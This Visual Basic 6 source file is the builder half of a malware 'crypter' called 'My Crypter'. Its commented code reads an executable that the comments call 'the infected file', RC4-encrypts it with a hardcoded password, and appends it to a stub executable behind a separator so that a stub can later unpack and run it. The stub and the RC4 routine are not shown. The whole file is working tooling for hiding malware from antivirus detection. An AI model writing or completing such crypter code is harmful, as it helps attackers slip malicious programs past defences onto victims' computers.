VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form cryptfrm 
   Caption         =   "My Crypter"
   ClientHeight    =   2880
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   4680
   LinkTopic       =   "Form1"
   ScaleHeight     =   2880
   ScaleWidth      =   4680
   StartUpPosition =   3  'Windows Default
   Begin MSComDlg.CommonDialog saveDiag 
      Left            =   3480
      Top             =   2400
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin MSComDlg.CommonDialog openDiag 
      Left            =   4080
      Top             =   2400
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.CommandButton btnBuild 
      Caption         =   "Build"
      Height          =   615
      Left            =   960
      TabIndex        =   6
      Top             =   2040
      Width           =   2175
   End
   Begin VB.CommandButton btnSave 
      Caption         =   "..."
      Height          =   375
      Left            =   3720
      TabIndex        =   4
      Top             =   1440
      Width           =   855
   End
   Begin VB.TextBox txtSavepath 
      Enabled         =   0   'False
      Height          =   375
      Left            =   120
      TabIndex        =   3
      Top             =   1440
      Width           =   3495
   End
   Begin VB.CommandButton btnBrowseOpen 
      Caption         =   "..."
      Height          =   375
      Left            =   3720
      TabIndex        =   2
      Top             =   600
      Width           =   855
   End
   Begin VB.TextBox txtfilepath 
      Enabled         =   0   'False
      Height          =   375
      Left            =   120
      TabIndex        =   0
      Top             =   600
      Width           =   3495
   End
   Begin VB.Label Label2 
      Caption         =   "Save output as.."
      BeginProperty Font 
         Name            =   "Verdana"
         Size            =   12
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   120
      TabIndex        =   5
      Top             =   1080
      Width           =   3375
   End
   Begin VB.Label Label1 
      Caption         =   "Select a file to crypt"
      BeginProperty Font 
         Name            =   "Verdana"
         Size            =   12
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   120
      TabIndex        =   1
      Top             =   120
      Width           =   3375
   End
End
Attribute VB_Name = "cryptfrm"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

'Declare some global vars
Dim openPath As String, savePath As String

'Your encryption password (must be the same in the stub)
Const myEncPass = "thepassword"

Private Sub btnBrowseOpen_Click()
    'Setting up the "open file" dialog box.
    openDiag.DialogTitle = "Select a file to open"
    openDiag.Filter = "Exe files | *.exe" 'Ensures only EXE files can be selected.
    openDiag.ShowOpen 'Opens up the dialog
    
    'Takes the filename that was selected in the dialog and stores it in your OpenPath var and
    'also displays it in the textbox
    openPath = openDiag.FileName
    txtfilepath.Text = openPath
End Sub

Private Sub btnSave_Click()
    'Setting up "save" dialog box
    saveDiag.DialogTitle = "Save as..."
    saveDiag.Filter = "Exe files | *.exe"
    saveDiag.ShowSave
    
    'Saves the path where we need to place the final product
    savePath = saveDiag.FileName
    txtSavepath.Text = savePath
End Sub

Private Sub btnBuild_Click()
    Dim infectedFile As String, newFile As String, stubfile As String
    
    'Opens the infected file
    Open openPath For Binary As #1
    infectedFile = Space(LOF(1)) 'Creates some space in a variable the same size as the file
    Get #1, , infectedFile 'Places the contents of the file in InfectedFile variable
    Close #1 'Closes the file handle
    
    'VERY IMPORTANT - encrypts your file based on your password
    infectedFile = RC4(infectedFile, myEncPass)
    
    'Opens your stub file and places its contents in your stubfile var
    Open App.Path & "\stub.exe" For Binary As #2
    stubfile = Space(LOF(2))
    Get #2, , stubfile
    Close #2
    
    'Creates your new variable called "newfile" which is where you will store your final product before
    'it is saved as an actual file. The value of your new file will be your stub file, a seperator, and
    'your ENCRYPTED infected file. The seperator "XSEPERATORX" can be anything you wish. This simply divides the
    'Stub and Infected files so you know where to split later
    newFile = stubfile & "XSEPERATORX" & infectedFile
    
    'Save the final file to wherever the user specifed
    Open savePath For Binary As #3
    Put #3, , newFile
    Close #3
    
    MsgBox "Built!"
End Sub
